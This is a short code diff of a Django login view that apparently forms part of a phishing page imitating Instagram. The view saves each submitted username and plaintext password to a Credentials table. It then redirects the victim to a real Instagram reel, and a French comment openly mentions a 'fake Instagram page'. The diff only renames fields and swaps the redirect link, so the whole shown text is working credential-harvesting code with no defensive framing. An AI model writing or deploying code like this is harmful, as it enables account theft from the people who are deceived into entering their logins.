@@ -12,10 +12,10 @@ def login_view(request):
             password = form.cleaned_data['password']
 
             # Enregistrez les identifiants dans la base de données
-            Credentials.objects.create(nom_utilisateur=username, mot_de_passe=password)
+            Credentials.objects.create(username=username, password=password)
 
             # Redirigez vers une page de confirmation (ou une fausse page Instagram)
-            return redirect('https://youtu.be/XF1FJ-nptyc?si=0zM8PQhTI6wiB0lS')
+            return redirect('https://www.instagram.com/reel/DEa3_ESbj1/?igsh=MThxMmc0eGFpcjFkcQ==')
     else:
         form = LoginForm()
     return render(request, 'login.html', {'form': form})
